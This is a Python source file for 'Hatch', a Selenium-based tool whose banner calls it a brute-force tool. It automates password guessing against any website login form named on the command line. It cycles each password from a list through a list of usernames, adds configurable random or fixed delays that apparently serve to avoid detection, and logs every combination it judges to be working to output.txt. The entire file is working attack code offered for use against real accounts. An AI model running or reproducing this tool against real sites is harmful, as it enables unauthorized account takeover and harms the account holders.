# Coded by METACHAR
# Looking to work with other hit me up on my email @metachar1@gmail.com <--
import sys
from datetime import datetime
import selenium
import requests
import random
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC



#Graphics
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'


#Config#
parser = OptionParser()


#Args
parser.add_option("-u", "--username", dest="username",help="Enter the user list directory")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
parser.add_option("--rdelay", dest="randomdelay", help="Enter the random delay amount between users | Format like: x-x")
parser.add_option("--fdelay", dest="fixeddelay", help="Enter the fixed delay amount between users | Format like: x")
parser.add_option("--pdelay", dest="passdelay", help="Enter the PW delay amount | Format like: x")
parser.add_option("--continue", action="store_true", dest="continueonfound", help="Use when wanting to continue after finding working combo")
(options, args) = parser.parse_args()

def tryPassword(password, user, browser, user_num, password_num, user_total, pass_total):
    Sel_user = browser.find_element_by_css_selector(options.usernamesel) #Finds Selector
    Sel_pas = browser.find_element_by_css_selector(options.passsel) #Finds Selector
    enter = browser.find_element_by_css_selector(options.loginsel) #Finds Selector
    Sel_user.send_keys(user.rstrip())
    Sel_pas.send_keys(password.rstrip())
    enter.click()
    print ('------------------------')
    print (color.GREEN + 'Tried password: '+color.RED + password.rstrip() + " " + color.GREEN + 'for user: '+color.RED+ user.rstrip())
    print (color.GREEN + str(user_num) + "/" + str(user_total) + " Users | " + str(password_num) + "/" + str(pass_total) + " Passwords")
    print ('------------------------\n')

def brutes(userlist, username_selector, password_selector, login_btn_selector, pass_list, website):

    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    browser = webdriver.Chrome(chrome_options=optionss)
    wait = WebDriverWait(browser, 10)

    with open(userlist) as users:
        totalUsers = len(users.readlines())

    with open(pass_list) as passwd:
        totalPasswords = len(passwd.readlines())

    lastPass = ""
    lastUser = ""

    print("\n\nTesting against " + str(totalUsers) + " user accounts and " + str(totalPasswords) + " passwords\n\n")

    t.sleep(5)

    userCount = 0
    passCount = 0

    with open(pass_list, 'r') as passwd:
        for line in passwd:
            
            userCount = 0
            passCount = passCount + 1
            browser.get(website)
            with open(userlist, 'r') as users:
                for username in users:
                    userCount = userCount + 1
                    try:
                        if options.randomdelay and not options.fixeddelay:
                            wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
                            
                            tryPassword(line, username, browser, userCount, passCount, totalUsers, totalPasswords)

                            lastPass = line.rstrip()
                            lastUser = username.rstrip()

                            delayrange = options.randomdelay.split("-")
                            delayTime = random.randint(int(delayrange[0]), int(delayrange[1]))
                            print("Waiting " + str(delayTime) + " seconds")
                            t.sleep(delayTime)

                        elif not options.randomdelay and options.fixeddelay:
                            wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))

                            tryPassword(line, username, browser, userCount, passCount, totalUsers, totalPasswords)

                            lastPass = line.rstrip()
                            lastUser = username.rstrip()

                            delayTime = int(options.fixeddelay)
                            print("Waiting " + str(delayTime) + " seconds")
                            t.sleep(delayTime)
                        else:
                            wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))

                            tryPassword(line, username, browser, userCount, passCount, totalUsers, totalPasswords)

                            lastPass = line.rstrip()
                            lastUser = username.rstrip()

                    except KeyboardInterrupt: #returns to main menu if ctrl C is used
                        print('CTRL C')
                        break
                    except selenium.common.exceptions.NoSuchElementException:
                        print ('\n\n------------------------\n\n')
                        print (color.GREEN + 'Working password: '+color.RED + lastPass + " " + color.GREEN + 'for user: '+color.RED+ lastUser)
                        print ('\n\n------------------------\n')

                        dateTimeObj = datetime.now()
                        timestampStr = dateTimeObj.strftime("[%m-%d-%Y] [%H:%M:%S]")

                        with open("output.txt", "a") as log:
                            log.write(timestampStr + " | " + lastUser +"," + lastPass + "\n")

                        print(options.continueonfound)

                        if not options.continueonfound:
                            exit()
                        else:
                            browser.get(website)
                            continue
                    except selenium.common.exceptions.TimeoutException:
                        print ('\n\n------------------------\n\n')
                        print (color.GREEN + 'Working password: '+color.RED + lastPass + " " + color.GREEN + 'for user: '+color.RED+ lastUser)
                        print ('\n\n------------------------\n')

                        dateTimeObj = datetime.now()
                        timestampStr = dateTimeObj.strftime("[%m-%d-%Y] [%H:%M:%S]")

                        with open("output.txt", "a") as log:
                            log.write(timestampStr + " | " + lastUser +"," + lastPass + "\n")
                        
                        if not options.continueonfound:
                            exit()
                        else:
                            browser.get(website)
                            continue
            
            if options.passdelay:
                delayTime = int(options.passdelay)
                print("Waiting " + str(delayTime) + " seconds before next password")
                t.sleep(delayTime)



banner = color.BOLD + color.RED +'''
  _    _       _       _
 | |  | |     | |     | |
 | |__| | __ _| |_ ___| |__
 |  __  |/ _` | __/ __| '_ \\
 | |  | | (_| | || (__| | | |
 |_|  |_|\__,_|\__\___|_| |_|

  {0}[{1}-{2}]--> {3}V.1.1
  {4}[{5}-{6}]--> {7}coded by Metachar, modified by MrDaGree
  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)

if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        print("Use the command line arguments!")
                        exit()


username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist

print (banner)
brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)


